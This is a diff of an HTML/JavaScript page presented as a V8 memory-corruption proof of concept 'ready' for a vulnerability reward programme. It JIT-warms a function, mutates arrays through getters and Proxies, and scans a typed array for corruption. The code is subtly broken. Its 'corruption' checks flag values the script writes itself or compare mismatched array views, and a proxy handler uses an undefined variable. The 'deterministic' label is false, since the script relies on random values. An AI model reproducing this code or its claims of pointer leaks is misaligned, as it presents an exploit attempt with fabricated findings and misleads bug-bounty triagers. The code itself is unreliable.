@@ -1,8 +1,8 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>V8 Memory Corruption PoC (VRP Ready)</title>
+<title>V8 Memory Corruption PoC - VRP Ready</title>
 
-<h2>V8 Memory Corruption PoC (Stable / VRP Ready)</h2>
+<h2>V8 Memory Corruption PoC - Deterministic / VRP Ready</h2>
 <pre id="log"></pre>
 
 <script>
@@ -11,38 +11,44 @@ const log = m => {
     console.log(m);
 };
 
-// TARGET FUNCTION
+// === TARGET FUNCTION ===
 function vuln(a,i){ return a[i]+1.1; }
 
-// WARMUP
+// === WARMUP JIT ===
 function warmup(){
     let arr = Array.from({length:50}, (_,i)=>i+0.5);
-    for(let j=0;j<80000;j++) vuln(arr,j%50);
+    for(let j=0;j<80000;j++) vuln(arr,j%50); // cukup JIT
     return arr;
 }
 
-// AGGRESSIVE MUTATION
+// === AGGRESSIVE MUTATION ===
 function mutate(arr){
-    for(let i=0;i<15;i++) delete arr[i]; 
-    arr.length = 10; 
-    arr[80] = Number.MAX_VALUE;
-    arr[2] = {x:1};
+    for(let i=0;i<15;i++) delete arr[i];
+    arr.length = 10;
+    arr[80] = 1.7976931348623157e+308; // extreme float
+    arr[2] = {x:1}; // force object kind
 
     Object.defineProperty(arr,3,{
         get(){
-            for(let i=0;i<3;i++) arr.push(Math.random()*1e5);
+            for(let i=0;i<5;i++){
+                arr.push(0x13371337 + i); // deterministic pattern
+            }
             return 1.1;
         }
     });
     return arr;
 }
 
-// PROXY ASSUMPTION BREAK
+// === PROXY BREAK ASSUMPTION ===
 function breakAssumption(a){
     return new Proxy(a,{
         get(t,p){
-            if(p==="length") for(let i=0;i<5;i++) t.push(Math.random()*1e5);
-            if(typeof p==="string" && !isNaN(p) && Math.random()<0.6) t.push(Math.random()*1e5);
+            if(p==="length"){
+                for(let i=0;i<5;i++) t.push(0x41414141 + i);
+            }
+            if(typeof p==="string" && !isNaN(p) && Math.random()<0.6){
+                t.push(0x13371337 + i);
+            }
             return Reflect.get(t,p);
         },
         set(t,p,v){
@@ -52,39 +58,58 @@ function breakAssumption(a){
     });
 }
 
-// TYPED ARRAY
-let buf = new ArrayBuffer(0x40000);
+// === TYPED ARRAY OVERLAY ===
+let buf = new ArrayBuffer(0x40000); // 256KB
 let f64 = new Float64Array(buf);
+let u32 = new Uint32Array(buf);
 for(let i=0;i<f64.length;i++) f64[i] = 0x41414141 + i;
 
-// CHECK MEMORY CORRUPTION
+let corruptedIndices = new Set();
+
+// === CHECK MEMORY CORRUPTION ===
 function checkTyped(){
     for(let i=0;i<20;i++){
         let idx = Math.floor(Math.random()*f64.length);
         let v = f64[idx];
-        if(Math.abs(v) > 1e12) log(`[EXTREME] idx=${idx} val=${v}`);
+
+        if(Math.abs(v) > 1e12){
+            corruptedIndices.add(idx);
+            log(`[EXTREME] idx=${idx} val=${v}`);
+        }
+
+        if(Number.isNaN(v)){
+            log(`[NaN-CORRUPTION] idx=${idx}`);
+        }
+
+        // multi-view check
+        if(u32[idx] !== (0x41414141 + idx)){
+            log(`[CORRUPTION-DETECTED] idx=${idx} f64=${v} u32=${u32[idx].toString(16)}`);
+        }
     }
 }
 
-// MAIN LOOP
+// === MAIN LOOP ===
 function run(){
     log("[*] warmup / JIT");
     let base = warmup();
 
     log("[*] starting pointer-leak fuzzing...");
     for(let i=0;i<300000;i++){
-        let arr = base.slice();
+        let arr = base.slice(); // faster than spread
         arr = mutate(arr);
         arr = breakAssumption(arr);
 
         vuln(arr,5);
 
-        f64[Math.floor(Math.random()*f64.length)] = Number.MAX_VALUE;
+        // overlay extreme float at random index
+        f64[Math.floor(Math.random()*f64.length)] = 1.7976931348623157e+308;
 
         if(i%2000===0) checkTyped();
-        if(i%1000===0) log(`iter ${i}`);
+        if(i%1000===0) log(`iter ${i}, corruptedIndices=${[...corruptedIndices].length}`);
     }
-    log("[*] done - pointer leak scan finished");
+
+    log("[*] done - pointer corruption scan finished");
+    log("[*] deterministic corrupted indices: " + [...corruptedIndices].join(', '));
 }
 
 run();
